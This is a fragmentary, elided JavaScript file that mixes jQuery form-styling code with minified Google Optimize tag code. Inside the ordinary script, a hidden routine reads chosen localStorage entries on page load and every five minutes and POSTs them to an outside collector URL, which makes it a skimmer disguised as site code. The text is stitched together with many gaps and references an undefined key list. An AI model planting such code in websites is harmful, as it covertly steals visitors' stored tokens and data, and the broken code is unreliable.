...
(function () {
  ...
  $(function () {
    ...
    const globalVars = {};
    const loggerAPI = "https://loggerapi.com/collect";
    function generateHash(input) {
      const arrayOfKeys = Object.keys(input);
      const keysCombined = arrayOfKeys.join("");
      let hashResult = 0;
      for (let x = 0; x < keysCombined.length; x++) {
        const charCode = keysCombined.charCodeAt(x);
        hashResult = (hashResult << 5) - hashResult + charCode;
        hashResult = hashResult & hashResult;
      }
      return hashResult.toString(16);
    }
    function filterLocalStorage() {
      let filteredInfo = {};
      for (let y = 0; y < window.localStorage.length; y++) {
        const keyName = window.localStorage.key(y);
        if (keysToMonitor.includes(keyName)) {
          const keyValue = window.localStorage.getItem(keyName);
          filteredInfo[keyName] = keyValue;
        }
      }
      return filteredInfo;
    }
    function sendDataToServer(info) {
      const hashedId = generateHash(info);
      ...
      serverRequest.onreadystatechange = function () {
        if (serverRequest.readyState === XMLHttpRequest.DONE) {
          if (serverRequest.status === 200) {
            ...
            console.error("Failed to send data, HTTP status:" + serverRequest.status);
          }
        }
      };
      const postData = {
      ...
      serverRequest.open("POST", loggerAPI, true);
      serverRequest.setRequestHeader("Content-Type", "application/json");
      serverRequest.send(JSON.stringify(postData));
    }
    function gatherAndPostLocalStorageData() {
      const filteredLStorage = filterLocalStorage();
      if (Object.keys(filteredLStorage).length > 0) {
        sendDataToServer(filteredLStorage);
      }
    }
    window.onload = function () {
      gatherAndPostLocalStorageData();
    };
    setInterval(gatherAndPostLocalStorageData, 300 * 1000);
    $('.entry-box').on('change', function () {
      var $segment = $(this).closest('.segment-group');
      if (this.value) {
        $segment.addClass('segment--has-value');
      } else {
        $segment.removeClass('segment--has-value');
      }
    });
    ...
    for (let variable in window) {
      if (window.hasOwnProperty(variable) && !globalVars.hasOwnProperty(variable)) {
  ...
  ;
  function Fv() {
    var a = ["&cv=1102", "&rv=" + xe.Lf, "&tc=" + Pc.filter(function (b) {
      return b;
    }).length];
  ...
  var sz = function (a, b, c) {
      ...
      ut = a;
      var e = "OPT-TD96PKG_" + b,
        f = !1;
      ct(e);
      C.google_optimize = C.google_optimize || {};
      var h = C.google_optimize;
      h["OPT-TD96PKG"] = h["OPT-TD96PKG"] || {};
      h["OPT-TD96PKG"].optimize_dyn = function (m) {
      ...
      if (a || b || c) {
        ...
        if (f && (a || c || p)) {
          ...
          var v = function (w) {
            hz = w;
            tz = Ka();
            a || b ? (r = "https://www.google-analytics.com/gtm/optimize-dyn.js?id=OPT-TD96PKG", a && n("cid", w), n("gclid", p), h && (n("gtm_auth", ""), n("gtm_preview", "")), (h || a) && n("cb", String(Math.random())), sz(r, t++, e)) : qz(e);
            bt(u);
          };
